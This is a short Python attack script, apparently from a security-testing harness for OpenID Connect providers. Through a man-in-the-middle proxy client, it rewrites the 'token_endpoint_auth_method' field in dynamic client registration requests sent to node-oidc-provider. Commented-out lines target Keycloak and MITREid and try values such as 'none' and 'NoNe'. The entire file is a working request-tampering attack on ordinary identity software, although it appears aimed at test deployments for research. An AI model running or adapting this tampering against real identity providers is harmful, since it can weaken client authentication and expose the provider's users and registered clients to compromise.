#!/usr/bin/env python3

from lib.attacks import *
from lib.client import MITMClient

if __name__ == "__main__":
    client = MITMClient()
    # cleanup previous mitm proxy hooks
    client.send(ClearCommand())

    # prepare attack to replace values in json post requests
    cmd = ReplacePostJsonCommand()

    # Set register uri
    #cmd.uri = "keycloak/auth/realms/master/clients-registrations/openid-connect"
    cmd.uri = "node-oidc-provider/reg"
    #cmd.uri = "mitreid-server/oidc-server/register"

    # Change client authentication method
    #cmd.replaceKeyVal("token_endpoint_auth_method", 'Invalid')
    #cmd.replaceKeyVal("token_endpoint_auth_method", 'none')
    #cmd.replaceKeyVal("token_endpoint_auth_method", 'private_key_jwt')
    cmd.replaceKeyVal("token_endpoint_auth_method", 'client_secret_jwt')
    #cmd.replaceKeyVal("token_endpoint_auth_method", "NoNe")

    client.send(cmd)
